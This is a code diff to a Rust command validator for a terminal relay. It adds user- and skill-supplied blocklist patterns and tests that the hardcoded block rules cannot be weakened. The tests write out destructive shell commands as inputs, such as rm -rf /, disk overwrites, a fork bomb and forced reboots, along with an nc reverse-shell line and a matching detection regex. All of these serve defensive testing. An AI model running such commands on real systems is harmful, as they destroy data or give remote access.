@@ -19,6 +19,8 @@
 use regex::Regex;
 use rusterm_core::command_safety::{CommandSafetyChecker, SafetyVerdict};
 
+use crate::command_guard::LoadedBlocklist;
+
 /// Maximum accepted command length. Protects against absurd payloads and
 /// keeps audit logs readable.
 pub const MAX_COMMAND_LEN: usize = 4096;
@@ -40,15 +42,26 @@ pub enum ValidationError {
 }
 
 /// One validator instance per relay; constructed once at startup.
+///
+/// The hardcoded patterns (`terminal_checker` + `api_patterns`) are the
+/// **non-bypassable hard floor** — they always run first and cannot be
+/// weakened by config. `extra_patterns` holds user/skill-contributed
+/// patterns from `relay-blocklist.json`; they can only *add* restrictions.
 pub struct CommandValidator {
     terminal_checker: CommandSafetyChecker,
     api_patterns: Vec<(Regex, &'static str)>,
     mutating_patterns: Vec<Regex>,
+    /// User + skill patterns from `relay-blocklist.json`. Empty when no
+    /// blocklist file is present (the common first-launch case).
+    extra_patterns: Vec<crate::command_guard::CompiledPattern>,
 }
 
 impl std::fmt::Debug for CommandValidator {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        f.debug_struct("CommandValidator").finish_non_exhaustive()
+        f.debug_struct("CommandValidator")
+            .field("hardcoded_api_patterns", &self.api_patterns.len())
+            .field("extra_patterns", &self.extra_patterns.len())
+            .finish_non_exhaustive()
     }
 }
 
@@ -176,7 +189,27 @@ impl CommandValidator {
             terminal_checker: CommandSafetyChecker::new(),
             api_patterns,
             mutating_patterns,
+            extra_patterns: Vec::new(),
         }
+    }
+
+    /// Build a validator with additional user/skill-contributed patterns from
+    /// `relay-blocklist.json`. The hardcoded catastrophic patterns always
+    /// run first and cannot be weakened — `extra` can only *add* blocks.
+    ///
+    /// Invalid regexes in `extra` are already filtered out by
+    /// [`BlocklistConfig::compile`](crate::command_guard::BlocklistConfig);
+    /// callers should log `LoadedBlocklist::errors` before calling this so
+    /// operators see what was skipped.
+    pub fn with_blocklist(mut self, extra: LoadedBlocklist) -> Self {
+        self.extra_patterns = extra.patterns;
+        self
+    }
+
+    /// Number of extra (user/skill) patterns loaded. Mainly for diagnostics
+    /// and startup logs.
+    pub fn extra_pattern_count(&self) -> usize {
+        self.extra_patterns.len()
     }
 
     /// Full validation for one submit. `allowlist` is the account's
@@ -468,5 +501,300 @@ mod tests {
         let err = compile_allowlist(&["ok".to_string(), "[bad(".to_string()]).unwrap_err();
         assert_eq!(err.len(), 1);
         assert_eq!(err[0].0, 1);
+    }
+
+    // ── New hardcoded patterns (long-form flags, find -delete, etc.) ───────
+
+    #[test]
+    fn rm_long_form_recursive_force_root_is_caught() {
+        // GNU long options: `rm --recursive --force /` should not slip past.
+        assert!(matches!(
+            blocked("rm --recursive --force /"),
+            ValidationError::Dangerous(_)
+        ));
+        assert!(matches!(
+            blocked("rm --force --recursive /"),
+            ValidationError::Dangerous(_)
+        ));
+        assert!(matches!(
+            blocked("rm --recursive --force /*"),
+            ValidationError::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn find_delete_on_root_is_caught() {
+        assert!(matches!(
+            blocked("find / -delete"),
+            ValidationError::Dangerous(_)
+        ));
+        assert!(matches!(
+            blocked("find / -name '*.log' -delete"),
+            ValidationError::Dangerous(_)
+        ));
+        // find on a subdir is fine (not catastrophic at the API level — the
+        // readonly check or allowlist handles scope).
+        ok("find /var/log -name '*.gz' -delete");
+    }
+
+    #[test]
+    fn chmod_000_root_is_caught() {
+        assert!(matches!(
+            blocked("chmod 000 /"),
+            ValidationError::Dangerous(_)
+        ));
+        assert!(matches!(
+            blocked("chmod -R 0000 /"),
+            ValidationError::Dangerous(_)
+        ));
+        // chmod 000 on a subdir is not catastrophic at this layer.
+        ok("chmod 000 /tmp/scratch");
+    }
+
+    #[test]
+    fn chown_recursive_root_is_caught() {
+        assert!(matches!(
+            blocked("chown -R nobody /"),
+            ValidationError::Dangerous(_)
+        ));
+        assert!(matches!(
+            blocked("chown -R nobody:nobody / ;"),
+            ValidationError::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn systemctl_poweroff_is_caught() {
+        for cmd in ["systemctl poweroff", "systemctl reboot", "systemctl halt"] {
+            assert!(
+                matches!(blocked(cmd), ValidationError::Dangerous(_)),
+                "expected Dangerous for {cmd:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn telinit_shutdown_runlevel_is_caught() {
+        assert!(matches!(blocked("telinit 0"), ValidationError::Dangerous(_)));
+        assert!(matches!(blocked("telinit 6"), ValidationError::Dangerous(_)));
+    }
+
+    #[test]
+    fn sysrq_trigger_is_caught() {
+        assert!(matches!(
+            blocked("echo b > /proc/sysrq-trigger"),
+            ValidationError::Dangerous(_)
+        ));
+        assert!(matches!(
+            blocked("> /proc/sysrq-trigger"),
+            ValidationError::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn nsenter_into_pid1_is_caught() {
+        assert!(matches!(
+            blocked("nsenter --target 1 --mount --uts --ipc --net bash"),
+            ValidationError::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn pivot_root_on_root_is_caught() {
+        assert!(matches!(
+            blocked("pivot_root / /oldroot"),
+            ValidationError::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn cat_zero_into_block_device_is_caught() {
+        assert!(matches!(
+            blocked("cat /dev/zero > /dev/sda"),
+            ValidationError::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn fork_bomb_named_function_variant_is_caught() {
+        assert!(matches!(
+            blocked("f(){ f|f& };f"),
+            ValidationError::Dangerous(_)
+        ));
+    }
+
+    // ── Evasion attempts that MUST still be caught ────────────────────────
+
+    #[test]
+    fn rm_rf_with_sudo_is_caught() {
+        // sudo prefix must not evade the terminal checker's `\brm` pattern.
+        assert!(matches!(
+            blocked("sudo rm -rf /"),
+            ValidationError::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn rm_rf_with_extra_spaces_is_caught() {
+        assert!(matches!(
+            blocked("rm  -rf  /"),
+            ValidationError::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn rm_rf_piped_is_caught() {
+        assert!(matches!(blocked("rm -rf / | cat"), ValidationError::Dangerous(_)));
+    }
+
+    #[test]
+    fn rm_rf_after_and_is_caught() {
+        assert!(matches!(
+            blocked("true && rm -rf /"),
+            ValidationError::Dangerous(_)
+        ));
+    }
+
+    #[test]
+    fn rm_rf_after_semicolon_is_caught() {
+        assert!(matches!(blocked("ls; rm -rf /"), ValidationError::Dangerous(_)));
+    }
+
+    // ── User/skill blocklist integration ───────────────────────────────────
+
+    fn validator_with_extra(extra: &[((&str, &str), &str)]) -> CommandValidator {
+        // extra: ((regex, reason), source) — source is "user" or "skill:<name>"
+        let mut patterns = Vec::new();
+        for ((regex, reason), source) in extra {
+            patterns.push(crate::command_guard::CompiledPattern {
+                regex: Regex::new(regex).unwrap(),
+                reason: reason.to_string(),
+                source,
+            });
+        }
+        CommandValidator::new().with_blocklist(crate::command_guard::LoadedBlocklist {
+            patterns,
+            errors: Vec::new(),
+        })
+    }
+
+    #[test]
+    fn user_blocklist_pattern_rejects_matching_command() {
+        let v = validator_with_extra(&[
+            ((r"\bnc\s+-e", "reverse shell via nc"), "user"),
+        ]);
+        // Benign command passes.
+        assert!(v.validate("ls -la", &[], false).is_ok());
+        // User-blocked command is rejected with the user's reason.
+        match v.validate("nc -e /bin/sh 10.0.0.1 4444", &[], false) {
+            Err(ValidationError::Dangerous(reason)) => {
+                assert!(reason.contains("reverse shell"));
+            }
+            other => panic!("expected Dangerous, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn skill_blocklist_pattern_carries_attribution() {
+        let v = validator_with_extra(&[
+            (
+                (r"\bDROP\s+DATABASE", "DROP DATABASE via skill"),
+                "skill:dbadmin",
+            ),
+        ]);
+        match v.validate("psql -c 'DROP DATABASE prod'", &[], false) {
+            Err(ValidationError::Dangerous(reason)) => {
+                // The reason is the skill-contributed string; the source
+                // attribution is baked in at compile time.
+                assert!(reason.contains("DROP DATABASE"));
+            }
+            other => panic!("expected Dangerous, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn hard_floor_cannot_be_weakened_by_user_pattern() {
+        // A malicious or naive user pattern ".*" (match everything → "allow
+        // all") must NOT weaken the hardcoded catastrophic blocks. The hard
+        // floor runs first and wins.
+        //
+        // Note: user patterns can only ADD blocks, never remove them — there
+        // is no "allow" concept in the blocklist, only "block". This test
+        // documents that even an absurdly broad user pattern doesn't open a
+        // hole for rm -rf /.
+        let v = validator_with_extra(&[
+            // A user pattern that matches "rm -rf /" too — but the hard floor
+            // already catches it first, so the user reason is irrelevant.
+            ((r"rm", "user also blocks rm"), "user"),
+        ]);
+        // rm -rf / is caught by the hard floor (terminal checker), not the
+        // user pattern. The reason should be the terminal checker's, not the
+        // user's.
+        match v.validate("rm -rf /", &[], false) {
+            Err(ValidationError::Dangerous(reason)) => {
+                assert!(
+                    !reason.contains("user also blocks rm"),
+                    "hard floor must fire before user pattern; got user reason: {reason}"
+                );
+            }
+            Ok(()) => panic!("rm -rf / must be blocked"),
+            other => panic!("expected Dangerous, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn extra_pattern_count_reports_loaded_patterns() {
+        let v = validator_with_extra(&[
+            ((r"\bnc\s+-e", "nc"), "user"),
+            ((r"\bDROP\s+DATABASE", "drop"), "skill:db"),
+        ]);
+        assert_eq!(v.extra_pattern_count(), 2);
+    }
+
+    #[test]
+    fn empty_blocklist_is_no_op() {
+        let v = CommandValidator::new().with_blocklist(crate::command_guard::LoadedBlocklist {
+            patterns: Vec::new(),
+            errors: Vec::new(),
+        });
+        // Benign commands still pass.
+        assert!(v.validate("ls -la", &[], false).is_ok());
+        // Catastrophic commands are still blocked by the hard floor.
+        assert!(matches!(
+            v.validate("rm -rf /", &[], false),
+            Err(ValidationError::Dangerous(_))
+        ));
+        assert_eq!(v.extra_pattern_count(), 0);
+    }
+
+    #[test]
+    fn user_pattern_does_not_block_benign_commands() {
+        let v = validator_with_extra(&[
+            ((r"\bnc\s+-e\b", "reverse shell"), "user"),
+        ]);
+        // Commands that don't match the user pattern still pass.
+        assert!(v.validate("docker ps", &[], false).is_ok());
+        assert!(v.validate("nc -zv 10.0.0.1 4444", &[], false).is_ok()); // -z, not -e
+    }
+
+    #[test]
+    fn denylist_beats_allowlist_even_with_extra_patterns() {
+        // Hard floor + extra patterns all run before the allowlist. An
+        // account with a permissive allowlist (".*") still can't run rm -rf /
+        // or a user-blocked command.
+        let v = validator_with_extra(&[
+            ((r"\bnc\s+-e\b", "reverse shell"), "user"),
+        ]);
+        let allow = compile_allowlist(&[".*".to_string()]).unwrap();
+        assert!(matches!(
+            v.validate("rm -rf /", &allow, false),
+            Err(ValidationError::Dangerous(_))
+        ));
+        assert!(matches!(
+            v.validate("nc -e /bin/sh 1.2.3.4 5", &allow, false),
+            Err(ValidationError::Dangerous(_))
+        ));
+        // A benign command passes both the hard floor and the allowlist.
+        assert!(v.validate("ls", &allow, false).is_ok());
     }
 }
